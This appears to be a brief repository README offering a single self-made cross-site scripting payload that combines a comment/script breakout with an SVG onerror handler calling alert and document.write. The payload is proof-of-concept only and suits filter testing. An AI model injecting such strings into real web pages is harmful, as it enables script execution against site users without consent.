# xss
Personally created XSS payloads

# Danger zone! <br>

## Document.write <br>

```html
;//<!----><SCRIPT>alert(1);</SCRIPT><svg onerror="alert(document.write(1337))">
```
